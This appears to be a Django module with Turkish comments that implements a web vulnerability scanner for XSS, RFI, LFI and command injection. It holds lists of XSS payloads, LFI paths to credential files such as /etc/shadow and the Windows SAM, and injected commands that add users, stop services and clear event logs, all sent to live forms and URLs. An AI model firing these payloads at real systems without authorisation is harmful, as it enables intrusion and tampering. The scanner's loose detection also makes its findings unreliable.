import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
from django.db import models
from html import escape
from .models import ScannedUrl, XssVulnerability,RfiVulnerability,LfiVulnerability,CommandInjectionVulnerability



xss_vulnerabilities = []
rfi_vulnerabilities = []
lfi_vulnerabilities = []
command_injection_vulnerabilities = []

# XSS payloadları
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1);'>",
    "<body onload='alert(\"XSS\");'>",
    "<svg onload='alert(1)'>",
    "<details open='' ontoggle='javascript:alert(1)'>",
    "<img src=x onerror=alert('XSS')>",
    "<div style='width:expression(alert(\"XSS\"));'>",
    "<iframe src='javascript:alert(\"XSS\");'>",
    "<input type='image' src='x' onerror='alert(\"XSS\");'>",
    "<a href='javascript:alert(\"XSS\");'>Click me</a>",
    "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
    "<img src='x' onerror=eval(\"ale\"+\"rt('XSS')\")'>",
]

# LFI payloadları
lfi_payloads = [
    # Windows için
    "C:\\boot.ini",
    "..\\..\\..\\..\\boot.ini",
    "%SYSTEMDRIVE%\\pagefile.sys",
    "%WINDIR%\\debug\\NetSetup.log",
    "%WINDIR%\\repair\\sam",
    "%WINDIR%\\repair\\system",
    "%WINDIR%\\repair\\software",
    "%WINDIR%\\repair\\security",
    "%WINDIR%\\system32\\logfiles\\w3svc1\\exYYMMDD.log",
    "%WINDIR%\\system32\\config\\AppEvent.Evt",
    "%WINDIR%\\system32\\config\\SecEvent.Evt",
    "%WINDIR%\\system32\\config\\default.sav",
    "%WINDIR%\\system32\\config\\security.sav",
    "%WINDIR%\\system32\\config\\software.sav",
    "%WINDIR%\\system32\\config\\system.sav",
    "%WINDIR%\\system32\\CCM\\logs\\*.log",
    "%USERPROFILE%\\ntuser.dat",
    "%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat",
    "%WINDIR%\\System32\\drivers\\etc\\hosts",
    
    # Linux için
    "/etc/passwd",
    "/etc/resolv.conf",
    "/etc/motd",
    "/etc/issue",
    "/etc/shadow",
    "/home/xxx/.bash_history",
    "/etc/issue{,.net}",
    "/etc/master.passwd",
    "/etc/group",
    "/etc/hosts",
    "/etc/crontab",
    "/etc/sysctl.conf",
    "/etc/syslog.conf",
    "/etc/chttp.conf",
    "/etc/lighttpd.conf",
    "/etc/cups/cupsd.conf",
    "/etc/inetd.conf",
    "/opt/lampp/etc/httpd.conf",
    "/etc/samba/smb.conf",
    "/etc/openldap/ldap.conf",
    "/etc/ldap/ldap.conf",
    "/etc/exports",
    "/etc/auto.master",
    "/etc/auto_master",
    "/etc/fstab"
]

# Komut enjeksiyonu komutları
commands = [
    "&& help", "&& dir", "&& pwd", "&& cd ../../.. && dir",
    "&& ipconfig /all", "&& ifconfig", "&& ping -n 1 192.168.56.102", "&& ping -c 1 192.168.56.102",
    "&& set", "&& whoami", "&& net view", "&& net user", "&& net localgroup",
    "&& net user <username> /add", "&& useradd <username>",
    "&& net user <username> /delete", "&& net stop <service name>", "&& net start telnet", "&& net stop telnet",
    "&& wevtutil cl"
]


# XSS zafiyetlerini test et
def test_xss(url):
    xss_vulnerabilities
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    for form in soup.find_all('form'):
        for payload in xss_payloads:
            form_data = {}
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', '').lower()
                input_value = input_tag.get('value', '')
                if input_type == 'text':
                    input_value = payload  
                form_data[input_name] = input_value
            if form.get('method') == 'post':
                response = requests.post(url, data=form_data)
                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in str(soup):
                    xss_vulnerabilities.append((escape(payload), "form"))
            else:
                url_parts = list(urlparse(url))
                query = dict(parse_qs(url_parts[4]))
                query.update(form_data)
                url_parts[4] = urlencode(query)
                manipulated_url = urlunparse(url_parts)
                response = requests.get(manipulated_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in str(soup):
                    xss_vulnerabilities.append((escape(payload), "url", escape(manipulated_url)))
    if not any(vulnerability[1] == "form" for vulnerability in xss_vulnerabilities):
        for payload in xss_payloads:
            url_parts = list(urlparse(url))
            query = dict(parse_qs(url_parts[4]))
            for key in query.keys():
                original_value = query[key]
                query[key] = payload
                url_parts[4] = urlencode(query)
                manipulated_url = urlunparse(url_parts)
                response = requests.get(manipulated_url)
                if payload in str(response.text):
                    xss_vulnerabilities.append((escape(payload), "url", escape(manipulated_url)))
                query[key] = original_value
                
# RFI testi yap
def test_rfi(url, test_url):
        rfi_vulnerabilities
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            original_value = query_params[param]
            query_params[param] = test_url
            modified_query = urlencode(query_params, doseq=True)
            modified_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, modified_query, parsed_url.fragment))

            response = requests.get(modified_url)
            if response.status_code == 200 and test_url in response.text:
                rfi_vulnerabilities.append(modified_url)
            query_params[param] = original_value


# LFI testi yap
def test_lfi(url):
        lfi_vulnerabilities
        for payload in lfi_payloads:
            target_url = f"{url}?page={payload}"
            try:
                response = requests.get(target_url)
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in ["root:", "[boot loader]", "application event log", "version", "system", "shadow"]):
                    lfi_vulnerabilities.append(target_url)
                    return
            except requests.RequestException as e:
                continue

# Komut enjeksiyonu testi yap
def inject_commands(url, forms):
    vulnerable_forms = []

    for form in forms:
        form_data = {}
        for field in form.find_all('input'):
            form_data[field.get('name')] = field.get('value') or ''

        for command in commands:
            try:
                payload = f"$(echo '{command}')"
                form_data_copy = form_data.copy()
                for key, value in form_data_copy.items():
                    form_data_copy[key] = value + payload
                response = requests.post(url, data=form_data_copy)

                if response.status_code == 200:
                    if "command not found" not in response.text.lower() and "no such file or directory" not in response.text.lower():
                        vulnerable_forms.append(form_data_copy)
                        CommandInjectionVulnerability.objects.create(form_data=escape(str(form_data_copy)))
            except Exception as e:
                print("Form gönderilirken hata:", e)

    if vulnerable_forms:
        print("Formlara başarıyla komut enjeksiyonu yapıldı. İşe yarayan form verileri:")
        for form_data in vulnerable_forms:
            print(form_data)
    else:
        print("Sayfada form bulunamadı, doğrudan URL'ye istek gönderilecek.")

    return vulnerable_forms

def test_command_injection(url):
        command_injection_vulnerabilities
        try:
            response = requests.get(url)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                if forms:
                    vulnerable_forms = inject_commands(url, forms)
                    for form_data in vulnerable_forms:
                        command_injection_vulnerabilities.append(form_data)
                else:
                    for command in commands:
                        try:
                            payload = f"$(echo '{command}')"
                            response = requests.get(url + payload, timeout=5)

                            if response.status_code == 200:
                                if "command not found" not in response.text.lower() and "no such file or directory" not in response.text.lower():
                                    command_injection_vulnerabilities.append(url + payload)
                        except requests.exceptions.Timeout:
                            continue
                        except Exception as e:
                            continue
            else:
                print("URL'ye erişilemiyor, lütfen URL'nin doğru olduğundan emin olun.")
        except Exception as e:
            print("URL'ye erişilemiyor, lütfen URL'nin doğru olduğundan emin olun.")



def scan_url(url):
    ScannedUrl.objects.create(url=url)
    test_xss(url)
    test_rfi(url, url)
    test_lfi(url)
    test_command_injection(url)

    scan_results = {
        "xss_vulnerabilities": xss_vulnerabilities,
        "RFI Zafiyetleri ": rfi_vulnerabilities,
        "LFI Zafiyetleri:": lfi_vulnerabilities,
        "Komut Enjeksiyonu Zafiyetleri:": command_injection_vulnerabilities
    }
    return scan_results



def schedule_scans(url):
    while True:
        scan_url(url)
        time.sleep(86400)  # 24 saat bekle

